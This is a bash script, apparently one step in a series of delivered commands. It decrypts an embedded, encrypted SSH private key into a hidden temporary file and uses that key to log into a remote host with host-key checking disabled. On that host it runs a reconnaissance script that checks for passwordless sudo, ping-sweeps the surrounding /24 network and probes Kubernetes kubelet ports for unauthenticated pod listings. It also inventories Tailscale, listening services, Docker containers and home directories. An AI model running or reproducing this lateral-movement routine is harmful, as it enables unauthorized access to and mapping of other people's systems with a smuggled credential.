echo "=== k221 delivery v3 ==="
P=$(tr -d '[:space:]' < /root/.rxk | sha256sum | awk '{print $1}')
echo "box-passphrase: $P"
cat > /tmp/.k221.b64 <<'K64'
U2FsdGVkX19IeIEXjMegVOi3ABx4Fbjx1AIW7d/GK/nJCd28VdD6CGs/D5/Qmkmv4SYYWQGpshmE
9xnLB6vd24ZqfRnfp70p6IDa4u1E9TVTTX+kXQWg4L+53r4J8iAqPhM/UUdmcxdX8LMPnlWedP0s
HBznf7lMDmqIcoNSrFZuydzXzk4d5KF8NAOBGyd3RMH8pQKCwzqkS88+I/ojf3qXagLmU7ymwdXA
EQ2P0AfCR8Pq9cM6QTY00t/6ixYd3OlnOz1U5fzuxREC7nkcAsuDs6KXiNg4oDzhK8bl9Czqliq8
CLVxX+rotl4EK7LtX8H1SOlZLLnD6lelzfOqZ4AVCgc0BuIV77PcQfQgxjYJDOvtYh8Xatrw5Ex4
rKiQ3rgtkK1DDjD2pd7CSHGBIgDVSKSO14ErSgO8WyXI8/Sa3RQYawXcWkwnElrUOu6y+TSP+5WW
378EKTaczWZ7reEXp5D6O2XIWiL6wQ4Rw+6H8gv8irfuIZtm/sl88YqShh/SlC39D4Ms335GmjRZ
8VqiTbau3XMxVN641e50zNMXeD72Wx4yN/Rn7lyTGCzNgFe70aTJWZ+Y+q3auQSKLw==
K64
openssl enc -d -a -A -aes-256-cbc -pbkdf2 -md sha256 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>&1 && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL3"
echo "=== 221 recon ==="
cat > /tmp/recon221.sh <<'RSH'
#!/bin/bash
echo "=== id ==="; id; sudo -n true 2>&1 && echo SUDO-OK
echo "=== ip addr ==="; ip -brief addr
echo "=== ip neigh ==="; ip neigh
echo "=== ping-sweep ==="; for i in $(seq 1 254); do (ping -c1 -W1 85.234.79.$i >/dev/null 2>&1 && echo "85.234.79.$i up") & done; wait
echo "=== neigh after ==="; ip neigh | grep -v FAILED | head -40
echo "=== kubelet probes ==="
for ip in 31 87 103 109 184 233; do
  for path in /healthz /pods; do
    code=$(curl -sk --max-time 4 "https://85.234.79.$ip:10250$path" -o /tmp/kube-$ip$(echo $path|tr / _) -w "%{http_code}")
    echo "  85.234.79.$ip:10250$path -> $code ($(wc -c < /tmp/kube-$ip$(echo $path|tr / _) 2>/dev/null) bytes)"
  done
done
echo "=== pods bodies (first 400 chars each) ==="
for ip in 31 87 103 109 184 233; do echo "-- $ip --"; head -c 400 /tmp/kube-$ip_pods 2>/dev/null; echo; done
echo "=== tailnet ==="; (command -v tailscale && tailscale status 2>&1 | head -8); ip link show tailscale0 2>&1 | head -2
echo "=== listening ==="; ss -tlnp 2>/dev/null | head -25
echo "=== docker ==="; docker ps 2>/dev/null | head -12
echo "=== homes ==="; ls /home/
RSH
chmod +x /tmp/recon221.sh
if [ -s /tmp/.k221 ]; then
  timeout 100 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/recon221.sh 2>&1 | head -150
else
  echo "no key, skip"
fi
echo "=== B15DONE ==="
